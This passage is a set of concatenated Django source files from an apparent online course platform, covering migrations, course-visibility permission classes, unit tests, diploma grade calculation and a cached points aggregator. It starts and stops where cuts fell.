        migrations.RemoveField(
            model_name='coursemodule',
            name='subchapter',
        ),
        migrations.AlterField(
            model_name='course',
            name='url',
            field=models.CharField(unique=True, validators=[django.core.validators.RegexValidator(regex='^[\\w\\-\\.]*$')], max_length=255, help_text='Input an URL identifier for this course.'),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='coursemodule',
            name='url',
            field=models.CharField(help_text='Input an URL identifier for this module.', validators=[django.core.validators.RegexValidator(regex='^[\\w\\-\\.]*$')], max_length=255),
            preserve_default=True,
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('course', '0010_auto_20151214_1714'),
    ]

    operations = [
        migrations.AddField(
            model_name='coursechapter',
            name='parent',
            field=models.ForeignKey(to='course.CourseChapter', blank=True, null=True, related_name='children'),                    
            preserve_default=True,
        ),
        migrations.AlterUniqueTogether(
            name='coursechapter',
            unique_together=set([]),
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0002_auto_20150427_1717'),
        ('course', '0020_auto_20160615_1239'),
    ]

    operations = [
        migrations.CreateModel(
            name='Enrollment',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
                ('personal_code', models.CharField(max_length=10, blank=True, default='')),
                ('course_instance', models.ForeignKey(to='course.CourseInstance')),                    
                ('user_profile', models.ForeignKey(to='userprofile.UserProfile')),                    
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AddField(
            model_name='courseinstance',
            name='students2',
            field=models.ManyToManyField(to='userprofile.UserProfile', through='course.Enrollment', related_name='enrolled', blank=True),
            preserve_default=True,
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.db.models.deletion


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0003_auto_20160728_1139'),
        ('course', '0024_auto_20160726_1232'),
    ]

    operations = [
        migrations.CreateModel(
            name='StudentGroup',
            fields=[
                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
                ('course_instance', models.ForeignKey(related_name='groups', to='course.CourseInstance')),                    
                ('members', models.ManyToManyField(to='userprofile.UserProfile', related_name='groups')),
            ],
            options={
                'ordering': ['course_instance', 'timestamp'],
            },
            bases=(models.Model,),
        ),
        migrations.AddField(
            model_name='enrollment',
            name='selected_group',
            field=models.ForeignKey(null=True, on_delete=django.db.models.deletion.SET_NULL, default=None, blank=True, to='course.StudentGroup'),
            preserve_default=True,
        ),
    ]

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import lib.models
import colorfield.fields


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0003_auto_20160728_1139'),
        ('course', '0028_auto_20160825_0601'),
    ]

    operations = [
        migrations.CreateModel(
            name='UserTag',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('name', models.CharField(max_length=200)),
                ('description', models.CharField(blank=True, max_length=164, help_text='Describe the usage or meaning of this usertag')),
                ('visible_to_students', models.BooleanField(default=False)),
                ('color', colorfield.fields.ColorField(default='#CD0000', help_text='Color that is used for this tag.', max_length=10)),
                ('course_instance', models.ForeignKey(related_name='usertags', to='course.CourseInstance')),                    
            ],
            options={
            },
            bases=(lib.models.UrlMixin, models.Model),
        ),
        migrations.CreateModel(
            name='UserTagging',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('course_instance', models.ForeignKey(related_name='taggings', to='course.CourseInstance')),                    
                ('tag', models.ForeignKey(related_name='taggings', to='course.UserTag')),                    
                ('user', models.ForeignKey(related_name='taggings', to='userprofile.UserProfile')),                    
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='usertagging',
            unique_together=set([('tag', 'user', 'course_instance')]),
        ),
        migrations.AlterIndexTogether(
            name='usertagging',
            index_together=set([('user', 'course_instance')]),
        ),
    ]

from django.http import Http404
from django.utils.translation import ugettext_lazy as _

from authorization.permissions import (
    ACCESS,
    Permission,
    MessageMixin,
    ObjectVisibleBasePermission,
    FilterBackend,
)
from exercise.cache.points import CachedPoints
from userprofile.models import UserProfile
from .models import (
    CourseModule,
    CourseInstance,
)


class CourseVisiblePermission(ObjectVisibleBasePermission):
    message = _("Permission denied by course visibility")
    model = CourseInstance
    obj_var = 'instance'

    def is_object_visible(self, request, view, course):
        """
        Find out if CourseInstance is visible to user
        We expect that AccessModePermission is checked first

         - Always visible to course staff
         - Always hidden if not open (visible_to_students)
         - Always visible if public
         - If not public:
           - Require authentication
           - If view_access == enrolled -> visible if student of the course
           - If enrollment audience external, user should be external
           - If enrollment audience internal, user should be internal
        """
        # NOTE: course is actually course instance

        # Course is always visible to staff members
        if view.is_course_staff:
            return True

        # Course is not visible if it's hidden
        if not course.visible_to_students:
            self.error_msg(_("The resource is not currently visible."))
            return False

        user = request.user
        show_for = course.view_content_to
        VA = course.VIEW_ACCESS

        # FIXME: we probably should test if access_mode is ANONYMOUS (public), but that
        # would break api permissiosn (requires get_access_mode)
        if show_for != VA.PUBLIC:
            if not user.is_authenticated():                    
                self.error_msg(_("This course is not open for public."))
                return False

            # Handle enroll views separately
            if view.get_access_mode() == ACCESS.ENROLL:
                return self.enrollment_audience_check(request, course, user)

            if show_for == VA.ENROLLED:
                if not course.is_student(user):
                    self.error_msg(_("Only enrolled students shall pass."))
                    return False

            elif show_for == VA.ENROLLMENT_AUDIENCE:
                return self.enrollment_audience_check(request, course, user)

        return True

    def enrollment_audience_check(self, request, course, user):
        audience = course.enrollment_audience
        external = user.userprofile.is_external
        EA = course.ENROLLMENT_AUDIENCE
        if audience == EA.INTERNAL_USERS and external:
            self.error_msg(_("This course is only for internal students."))
            return False
        elif audience == EA.EXTERNAL_USERS and not external:
            self.error_msg(_("This course is only for external students."))
            return False
        return True


class EnrollInfoVisiblePermission(ObjectVisibleBasePermission):
    message = _("Permission denied by course visibility")
    model = CourseInstance
    obj_var = 'instance'

    def is_object_visible(self, request, view, course_instance):
        # Course is always visible to staff members
        if view.is_course_staff:
            return True

        # Course is not visible if it's hidden
        if not course_instance.visible_to_students:
            self.error_msg(_("The resource is not currently visible."))
            return False

        # Only public courses may be browsed without logging in.
        if course_instance.view_content_to != course_instance.VIEW_ACCESS.PUBLIC \
                and not request.user.is_authenticated:
            self.error_msg(_("This course is not open for public."))
            return False

        return True


class CourseModulePermission(MessageMixin, Permission):
    message = _("The module is not currently visible")

    def has_permission(self, request, view):
        if not view.is_course_staff:
            module = view.module
            return self.has_object_permission(request, view, module)
        return True

    def has_object_permission(self, request, view, module):
        if not isinstance(module, CourseModule):
            return True

        if module.status == CourseModule.STATUS.HIDDEN:
            return False

        if not module.is_after_open():
            # FIXME: use format from django settings
            self.error_msg(
                _("The module will open for submissions at {date}."),
                format={'date': module.opening_time},
                delim=' ',
            )
            return False

        if module.requirements.count() > 0:
            points = CachedPoints(module.course_instance, request.user, view.content)
            return module.are_requirements_passed(points)
        return True


class OnlyCourseTeacherPermission(Permission):
    message = _("Only course teacher is allowed")

    def has_permission(self, request, view):
        return self.has_object_permission(request, view, view.instance)

    def has_object_permission(self, request, view, obj):
        return view.is_teacher or request.user.is_superuser


class OnlyCourseStaffPermission(Permission):
    message = _("Only course staff is allowed")

    def has_permission(self, request, view):
        return self.has_object_permission(request, view, view.instance)

    def has_object_permission(self, request, view, obj):
        return view.is_course_staff or request.user.is_superuser


class IsCourseAdminOrUserObjIsSelf(OnlyCourseStaffPermission, FilterBackend):

    def has_object_permission(self, request, view, obj):
        if not isinstance(obj, UserProfile):
            return True

        user = request.user
        return user and (
            (user.id is not None and user.id == obj.user_id) or
            super().has_object_permission(request, view, obj)
        )

    def filter_queryset(self, request, queryset, view):
        user = request.user
        if (
            issubclass(queryset.model, UserProfile) and
            not view.is_course_staff and
            not user.is_superuser
        ):
            queryset = queryset.filter(user_id=user.id)
        return queryset

from datetime import timedelta

from django.contrib.auth.models import User
from django.core.urlresolvers import reverse                    
from django.test import TestCase
from django.test.client import Client
from django.utils import timezone

from course.models import Course, CourseInstance, CourseHook, CourseModule, \
    LearningObjectCategory, StudentGroup
from exercise.models import BaseExercise, Submission
from exercise.exercise_models import LearningObject


class CourseTest(TestCase):
    def setUp(self):
        self.client = Client()

        self.user = User(username="testUser")
        self.user.set_password("testPassword")
        self.user.save()

        self.grader = User(username="grader", is_staff=True)
        self.grader.set_password("graderPassword")
        self.grader.save()

        self.superuser = User(username="staff", is_staff=False, is_superuser=True)
        self.superuser.set_password("staffPassword")
        self.superuser.save()

        self.course = Course.objects.create(
            name="test course",
            code="123456",
            url="Course-Url"
        )

        self.today = timezone.now()
        self.tomorrow = self.today + timedelta(days=1)
        self.two_days_from_now = self.tomorrow + timedelta(days=1)
        self.yesterday = self.today - timedelta(days=1)

        self.past_course_instance = CourseInstance.objects.create(
            instance_name="Fall 2011 day 0",
            starting_time=self.yesterday,
            ending_time=self.today,
            course=self.course,
            url="T-00.1000_d0"
        )

        self.current_course_instance = CourseInstance.objects.create(
            instance_name="Fall 2011 day 1",
            starting_time=self.today,
            ending_time=self.tomorrow,
            course=self.course,
            url="T-00.1000_d1"
        )

        self.future_course_instance = CourseInstance.objects.create(
            instance_name="Fall 2011 day 2",
            starting_time=self.tomorrow,
            ending_time=self.two_days_from_now,
            course=self.course,
            url="T-00.1000_d2"
        )

        self.hidden_course_instance = CourseInstance.objects.create(
            instance_name="Secret super course",
            starting_time=self.tomorrow,
            ending_time=self.two_days_from_now,
            course=self.course,
            url="T-00.1000_hidden",
            visible_to_students=False
        )

        self.course_module = CourseModule.objects.create(
            name="test module",
            url="test-module",
            points_to_pass=10,
            course_instance=self.current_course_instance,
            opening_time=self.today,
            closing_time=self.tomorrow
        )

        self.course_module_with_late_submissions_allowed = CourseModule.objects.create(
            name="test module",
            url="test-module-late",
            points_to_pass=50,
            course_instance=self.current_course_instance,
            opening_time=self.today,
            closing_time=self.tomorrow,
            late_submissions_allowed=True,
            late_submission_deadline=self.two_days_from_now,
            late_submission_penalty=0.2
        )

        self.learning_object_category = LearningObjectCategory.objects.create(
            name="test category",
            course_instance=self.current_course_instance,
            points_to_pass=5
        )

        #self.hidden_learning_object_category = LearningObjectCategory.objects.create(
        #    name="hidden category",
        #    course_instance=self.current_course_instance
        #)
        #self.hidden_learning_object_category.hidden_to.add(self.user.userprofile)

        self.learning_object = LearningObject.objects.create(
            name="test learning object",
            course_module=self.course_module,
            category=self.learning_object_category,
            url='l1',
        )

        self.broken_learning_object = LearningObject.objects.create(
            name="test learning object",
            course_module=self.course_module_with_late_submissions_allowed,
            category=self.learning_object_category,
            url='l2',
        )

        self.base_exercise = BaseExercise.objects.create(
            name="test exercise",
            course_module=self.course_module,
            category=self.learning_object_category,
            service_url="http://localhost/",
            url='b1',
        )

        self.submission = Submission.objects.create(
            exercise=self.base_exercise,
            grader=self.grader.userprofile
        )
        self.submission.submitters.add(self.user.userprofile)

        self.course_hook = CourseHook.objects.create(
            hook_url="test_hook_url",
            course_instance=self.current_course_instance
        )

    def test_course_instance_open(self):
        self.assertFalse(self.past_course_instance.is_open())
        self.assertTrue(self.current_course_instance.is_open())
        self.assertFalse(self.future_course_instance.is_open())

    def test_course_url(self):
        self.assertEqual("/Course-Url/T-00.1000_d1/", self.current_course_instance.get_absolute_url())
        self.assertEqual("/Course-Url/T-00.1000_hidden/", self.hidden_course_instance.get_absolute_url())

    def test_course_staff(self):
        self.assertFalse(self.course.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_assistant(self.user))
        self.assertFalse(self.current_course_instance.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(0, len(self.current_course_instance.get_course_staff_profiles()))

        self.current_course_instance.assistants.add(self.user.userprofile)

        self.assertFalse(self.course.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_assistant(self.user))
        self.assertFalse(self.current_course_instance.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))

        self.course.teachers.add(self.user.userprofile)

        self.assertTrue(self.course.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_assistant(self.user))
        self.assertTrue(self.current_course_instance.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))
        self.assertEquals("testUser", self.current_course_instance.get_course_staff_profiles()[0].shortname)

        self.current_course_instance.assistants.clear()

        self.assertTrue(self.course.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_assistant(self.user))
        self.assertTrue(self.current_course_instance.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))

        self.course.teachers.clear()

        self.assertFalse(self.course.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_assistant(self.user))
        self.assertFalse(self.current_course_instance.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(0, len(self.current_course_instance.get_course_staff_profiles()))

    def test_course_instance_submitters(self):
        students = self.current_course_instance.get_submitted_profiles()
        self.assertEquals(1, len(students))
        self.assertEquals("testUser", students[0].shortname)

        submission2 = Submission.objects.create(
            exercise=self.base_exercise,
            grader=self.grader.userprofile)
        submission2.submitters.add(self.user.userprofile)

        students = self.current_course_instance.get_submitted_profiles()
        self.assertEquals(1, len(students))
        self.assertEquals("testUser", students[0].shortname)

        submission3 = Submission.objects.create(
            exercise=self.base_exercise,
            grader=self.user.userprofile)
        submission3.submitters.add(self.grader.userprofile)

        students = self.current_course_instance.get_submitted_profiles()
        self.assertEquals(2, len(students))
        self.assertEquals("testUser", students[0].shortname)
        self.assertEquals("grader", students[1].shortname)

    def test_course_instance_visibility(self):
        self.assertTrue(self.current_course_instance.is_visible_to())
        self.assertFalse(self.hidden_course_instance.is_visible_to())
        self.assertTrue(self.current_course_instance.is_visible_to(self.user))
        self.assertFalse(self.hidden_course_instance.is_visible_to(self.user))
        self.assertTrue(self.current_course_instance.is_visible_to(self.superuser))
        self.assertTrue(self.hidden_course_instance.is_visible_to(self.superuser))

    def test_course_instance_get_visible(self):
        open_course_instances = CourseInstance.objects.get_visible()
        self.assertEqual(3, len(open_course_instances))
        self.assertTrue(self.current_course_instance in open_course_instances)
        self.assertTrue(self.future_course_instance in open_course_instances)

        open_course_instances = CourseInstance.objects.get_visible(self.user)
        self.assertEqual(3, len(open_course_instances))
        self.assertTrue(self.current_course_instance in open_course_instances)
        self.assertTrue(self.future_course_instance in open_course_instances)

        open_course_instances = CourseInstance.objects.get_visible(self.superuser)
        self.assertEqual(4, len(open_course_instances))
        self.assertTrue(self.current_course_instance in open_course_instances)
        self.assertTrue(self.future_course_instance in open_course_instances)
        self.assertTrue(self.hidden_course_instance in open_course_instances)

    def test_course_instance_unicode_string(self):
        self.assertEquals("123456 test course: Fall 2011 day 1", str(self.current_course_instance))
        self.assertEquals("123456 test course: Secret super course", str(self.hidden_course_instance))

    def test_course_hook_unicode_string(self):
        self.assertEquals("123456 test course: Fall 2011 day 1 -> test_hook_url", str(self.course_hook))

    def test_course_module_late_submission_point_worth(self):
        self.assertEquals(0, self.course_module.get_late_submission_point_worth())
        self.assertEquals(80, self.course_module_with_late_submissions_allowed.get_late_submission_point_worth())

    def test_course_module_open(self):
        self.assertFalse(self.course_module.is_open(self.yesterday))
        self.assertTrue(self.course_module.is_open(self.today))
        self.assertTrue(self.course_module.is_open())
        self.assertTrue(self.course_module.is_open(self.tomorrow))
        self.assertFalse(self.course_module.is_open(self.two_days_from_now))

    def test_course_module_after_open(self):
        self.assertFalse(self.course_module.is_after_open(self.yesterday))
        self.assertTrue(self.course_module.is_after_open(self.today))
        self.assertTrue(self.course_module.is_after_open())
        self.assertTrue(self.course_module.is_after_open(self.tomorrow))
        self.assertTrue(self.course_module.is_after_open(self.two_days_from_now))

    def test_course_views(self):
        response = self.client.get('/no_course/test', follow=True)
        self.assertEqual(response.status_code, 404)
        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)
        self.assertTrue(response.redirect_chain)
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, 'userprofile/login.html')

        self.client.login(username="testUser", password="testPassword")
        response = self.client.get('/no_course/test', follow=True)
        self.assertEqual(response.status_code, 404)
        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)
        self.assertEqual(response.status_code, 200)

        self.assertEqual(response.context["course"], self.course)
        self.assertEqual(response.context["instance"], self.current_course_instance)
        self.assertFalse(response.context["is_assistant"])
        self.assertFalse(response.context["is_teacher"])

        response = self.client.get(self.hidden_course_instance.get_absolute_url(), follow=True)
        self.assertEqual(response.status_code, 403)

    def test_course_teacher_views(self):
        url = self.current_course_instance.get_edit_url()
        response = self.client.get(url)
        self.assertEqual(response.status_code, 302)

        self.client.login(username="testUser", password="testPassword")
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)

        self.current_course_instance.assistants.add(self.grader.userprofile)
        self.client.login(username="grader", password="graderPassword")
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)
        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.context["is_assistant"])
        self.assertFalse(response.context["is_teacher"])

        self.current_course_instance.assistants.clear()
        self.course.teachers.add(self.grader.userprofile)
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)
        self.assertEqual(response.status_code, 200)
        self.assertFalse(response.context["is_assistant"])
        self.assertTrue(response.context["is_teacher"])

        self.client.logout()
        response = self.client.get(url)
        self.assertEqual(response.status_code, 302)

        self.client.login(username="staff", password="staffPassword")
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.assertFalse(response.context["is_assistant"])
        self.assertTrue(response.context["is_teacher"])

    def test_groups(self):
        group = StudentGroup(course_instance=self.current_course_instance)
        group.save()
        group.members.add(self.user.userprofile,self.grader.userprofile)
        self.assertEqual(StudentGroup.get_exact(self.current_course_instance,
            [self.user.userprofile,self.grader.userprofile]), group)
        self.assertEqual(StudentGroup.get_exact(self.current_course_instance,
            [self.user.userprofile,self.superuser.userprofile]), None)

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0006_auto_20150625_1823'),
        ('userprofile', '0002_auto_20150427_1717'),
    ]

    state_operations = [
        migrations.CreateModel(
            name='DeadlineRuleDeviation',
            fields=[
                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),
                ('extra_minutes', models.IntegerField()),
                ('exercise', models.ForeignKey(to='exercise.BaseExercise')),                    
                ('submitter', models.ForeignKey(to='userprofile.UserProfile')),                    
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='MaxSubmissionsRuleDeviation',
            fields=[
                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),
                ('extra_submissions', models.IntegerField()),
                ('exercise', models.ForeignKey(to='exercise.BaseExercise')),                    
                ('submitter', models.ForeignKey(to='userprofile.UserProfile')),                    
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='maxsubmissionsruledeviation',
            unique_together=set([('exercise', 'submitter')]),
        ),
        migrations.AlterUniqueTogether(
            name='deadlineruledeviation',
            unique_together=set([('exercise', 'submitter')]),
        ),
    ]
    
    operations = [
        migrations.SeparateDatabaseAndState(state_operations=state_operations)
    ]

from copy import copy


def calculate_grade(total_points, point_limits, pad_points):
    points = total_points['points']
    d_points = copy(total_points['points_by_difficulty'])

    def pass_limit(bound):
        if isinstance(bound, list):
            ds,ls = zip(*bound)
            for i,d in enumerate(ds):

                if pad_points:
                    p = d_points.get(d, 0)
                    l = ls[i]
                    if p < l:
                        for j in range(i + 1, len(ds)):
                            jd = ds[j]
                            jp = d_points.get(jd, 0)
                            if jp > l - p:
                                d_points[jd] -= l - p
                                d_points[d] = l
                                break
                            else:
                                p += jp
                                d_points[d] = p
                                d_points[jd] = 0
                    else:
                        continue

                if d_points.get(d, 0) < ls[i]:
                    return False

            return True
        else:
            return points >= bound

    grade = 0
    for bound in point_limits:
        if pass_limit(bound):
            grade += 1
        else:
            break
    return grade


def assign_grade(cached_points, diploma_design):

    if not (diploma_design and cached_points.user.is_authenticated()):                    
        return -1

    if not diploma_design.course.is_course_staff(cached_points.user):
        avail = diploma_design.availability
        opt = diploma_design.USERGROUP
        external = cached_points.user.userprofile.is_external
        if (
            (avail == opt.EXTERNAL_USERS and not external)
            or (avail == opt.INTERNAL_USERS and external)
        ):
            return -1

    def is_passed(model):
        entry,_,_,_ = cached_points.find(model)
        return entry['passed']
    if not all(is_passed(m) for m in diploma_design.modules_to_pass.all()):
        return 0
    if not all(is_passed(e) for e in diploma_design.exercises_to_pass.all()):
        return 0

    return calculate_grade(
        cached_points.total(),
        diploma_design.point_limits,
        diploma_design.pad_points
    )

# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.db.models.deletion
import diploma.models
import lib.models
import lib.fields


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0024_auto_20160919_1951'),
        ('course', '0030_auto_20160912_1341'),
        ('userprofile', '0003_auto_20160728_1139'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseDiplomaDesign',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('logo', models.ImageField(null=True, blank=True, upload_to=diploma.models.build_upload_dir)),
                ('title', models.TextField(blank=True)),
                ('body', models.TextField(blank=True)),
                ('date', models.CharField(max_length=256)),
                ('signature_name', models.CharField(blank=True, max_length=256)),
                ('signature_title', models.CharField(blank=True, max_length=256)),
                ('small_print', models.TextField(blank=True)),
                ('point_limits', lib.fields.JSONField(blank=True, help_text='A list of length 5 where each element is the required points for n:th grade.The element can be a list of 2-tuples [[difficulty_level_a, points],[difficulty_level_b, points]].')),
                ('pad_points', models.BooleanField(help_text='If difficulty levels are used the lower level can be padded with higher level points.', default=False)),
                ('course', models.OneToOneField(on_delete=django.db.models.deletion.SET_NULL, to='course.CourseInstance', null=True)),
                ('exercises_to_pass', models.ManyToManyField(blank=True, to='exercise.BaseExercise')),
                ('modules_to_pass', models.ManyToManyField(blank=True, to='course.CourseModule')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='StudentDiploma',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('created', models.DateTimeField(auto_now=True)),
                ('hashkey', models.CharField(unique=True, max_length=32)),
                ('name', models.CharField(max_length=255)),
                ('grade', models.PositiveIntegerField(default=0)),
                ('design', models.ForeignKey(to='diploma.CourseDiplomaDesign')),                    
                ('profile', models.ForeignKey(on_delete=django.db.models.deletion.SET_NULL, to='userprofile.UserProfile', null=True)),
            ],
            options={
            },
            bases=(lib.models.UrlMixin, models.Model),
        ),
    ]

from django import template
from django.core.urlresolvers import reverse                    

from exercise.templatetags.exercise import _prepare_context
from ..grade import assign_grade
from ..models import CourseDiplomaDesign


register = template.Library()


@register.inclusion_tag("diploma/_diploma_button.html", takes_context=True)
def diploma_button(context, student=None):
    points = _prepare_context(context, student)
    design = CourseDiplomaDesign.objects.filter(course=points.instance).first()
    url = None
    if design and points.user.is_authenticated():                    
        url = reverse('diploma-create', kwargs={
            'coursediploma_id': design.id,
            'userprofile_id': points.user.userprofile.id,
        })
    return {
        'grade': assign_grade(points, design),
        'url': url,
        'is_course_staff': context.get('is_course_staff'),
    }

from django import template
from django.core.urlresolvers import reverse                    

from course.models import CourseInstance


register = template.Library()


def _normal_kwargs(instance, model_name, **extra_kwargs):
    kwargs = instance.get_url_kwargs()
    kwargs.update({
        "model": model_name,
    })
    kwargs.update(extra_kwargs)
    return kwargs


@register.filter
def editurl(model_object, model_name):
    return reverse('model-edit', kwargs=_normal_kwargs(
        model_object.course_instance,
        model_name,
        id=model_object.id,
    ))


@register.filter
def removeurl(model_object, model_name):
    return reverse('model-remove', kwargs=_normal_kwargs(
        model_object.course_instance,
        model_name,
        id=model_object.id,
    ))


@register.filter
def createurl(model_object, model_name):
    type_name = None
    if "," in model_name:
        model_name, type_name = model_name.split(",", 1)
    if isinstance(model_object, CourseInstance):
        return reverse('model-create', kwargs=_normal_kwargs(
            model_object,
            model_name,
        ))
    if type_name:
        return reverse('model-create-type-for', kwargs=_normal_kwargs(
            model_object.course_instance,
            model_name,
            parent_id=model_object.id,
            type=type_name,
        ))
    return reverse('model-create-for', kwargs=_normal_kwargs(
        model_object.course_instance,
        model_name,
        parent_id=model_object.id,
    ))

from copy import deepcopy
from django.db.models.signals import post_save, post_delete, m2m_changed
from django.utils import timezone

from lib.cache import CachedAbstract
from notification.models import Notification
from ..models import LearningObject, Submission
from .hierarchy import ContentMixin


class CachedPoints(ContentMixin, CachedAbstract):
    KEY_PREFIX = 'points'

    def __init__(self, course_instance, user, content):
        self.content = content
        self.instance = course_instance
        self.user = user
        super().__init__(course_instance, user)

    def _needs_generation(self, data):
        return data is None or data['created'] < self.content.created()

    def _generate_data(self, instance, user, data=None):
        data = deepcopy(self.content.data)
        module_index = data['module_index']
        exercise_index = data['exercise_index']
        modules = data['modules']
        categories = data['categories']
        total = data['total']

        # Augment submission parameters.
        def r_augment(children):
            for entry in children:
                if entry['submittable']:
                    entry.update({
                        'submission_count': 0,
                        'submissions': [],
                        'best_submission': None,
                        'points': 0,
                        'passed': entry['points_to_pass'] == 0,
                        'graded': False,
                        'unofficial': False,
                    })
                r_augment(entry.get('children'))
        for module in modules:
            module.update({
                'submission_count': 0,
                'points': 0,
                'points_by_difficulty': {},
                'unconfirmed_points_by_difficulty': {},
                'passed': module['points_to_pass'] == 0,
            })
            r_augment(module['children'])
        for entry in categories.values():
            entry.update({
                'submission_count': 0,
                'points': 0,
                'points_by_difficulty': {},
                'unconfirmed_points_by_difficulty': {},
                'passed': entry['points_to_pass'] == 0,
            })
        total.update({
            'submission_count': 0,
            'points': 0,
            'points_by_difficulty': {},
            'unconfirmed_points_by_difficulty': {},
        })

        # Augment submission data.
        if user.is_authenticated():                    
            submissions = (
                user.userprofile.submissions.exclude_errors()
                .filter(exercise__course_module__course_instance=instance)
                .prefetch_related('exercise')
                .only('id', 'exercise', 'submission_time', 'status', 'grade')
            )
            for submission in submissions:
                try:
                    tree = self._by_idx(modules, exercise_index[submission.exercise.id])
                except KeyError:
                    self.dirty = True
                    continue
                entry = tree[-1]
                entry['submission_count'] += 1 if not submission.status in (Submission.STATUS.ERROR, Submission.STATUS.UNOFFICIAL) else 0
                unofficial = submission.status == Submission.STATUS.UNOFFICIAL
                entry['submissions'].append({
                    'id': submission.id,
                    'max_points': entry['max_points'],
                    'points_to_pass': entry['points_to_pass'],
                    'confirm_the_level': entry.get('confirm_the_level', False),
                    'submission_count': 1, # to fool points badge
                    'points': submission.grade,
                    'graded': submission.is_graded,
                    'passed': submission.grade >= entry['points_to_pass'],
                    'submission_status': submission.status if not submission.is_graded else False,
                    'unofficial': unofficial,
                    'date': submission.submission_time,
                    'url': submission.get_url('submission-plain'),
                })
                if (
                    submission.status == Submission.STATUS.READY and (
                        entry['unofficial']
                        or submission.grade >= entry['points']
                    )
                ) or (
                    unofficial and (
                        not entry['graded']
                        or (entry['unofficial'] and submission.grade > entry['points'])
                    )
                ):
                    entry.update({
                        'best_submission': submission.id,
                        'points': submission.grade,
                        'passed': not unofficial and submission.grade >= entry['points_to_pass'],
                        'graded': submission.status == Submission.STATUS.READY,
                        'unofficial': unofficial,
                    })
                if submission.notifications.count() > 0:
                    entry['notified'] = True
                    if submission.notifications.filter(seen=False).count() > 0:
                        entry['unseen'] = True

        # Confirm points.
        def r_check(parent, children):
            for entry in children:
                if (
                    entry['submittable']
                    and entry['confirm_the_level']
                    and entry['passed']
                ):
                    if 'unconfirmed' in parent:
                        del(parent['unconfirmed'])
                    for child in parent.get('children', []):
                        if 'unconfirmed' in child:
                            del(child['unconfirmed'])
                r_check(entry, entry.get('children', []))
        for module in modules:
            r_check(module, module['children'])

        # Collect points and check limits.
        def add_to(target, entry):
            target['submission_count'] += entry['submission_count']
            if entry.get('unofficial', False):
                pass
            elif entry.get('unconfirmed', False):
                self._add_by_difficulty(
                    target['unconfirmed_points_by_difficulty'],
                    entry['difficulty'],
                    entry['points']
                )
            else:
                target['points'] += entry['points']
                self._add_by_difficulty(
                    target['points_by_difficulty'],
                    entry['difficulty'],
                    entry['points']
                )
        def r_collect(module, parent, children):
            passed = True
            max_points = 0
            submissions = 0
            points = 0
            confirm_entry = None
            for entry in children:
                if entry['submittable']:
                    if entry['confirm_the_level']:
                        confirm_entry = entry
                    else:
                        passed = passed and entry['passed']
                        max_points += entry['max_points']
                        submissions += entry['submission_count']
                        if entry['graded']:
                            points += entry['points']
                            add_to(module, entry)
                            add_to(categories[entry['category_id']], entry)
                            add_to(total, entry)
                passed = (
                    r_collect(module, entry, entry.get('children', []))
                    and passed
                )
            if confirm_entry and submissions > 0:
                confirm_entry['confirmable_points'] = True
            if parent and not parent['submittable']:
                parent['max_points'] = max_points
                parent['submission_count'] = submissions
                parent['points'] = points
            return passed
        for module in modules:
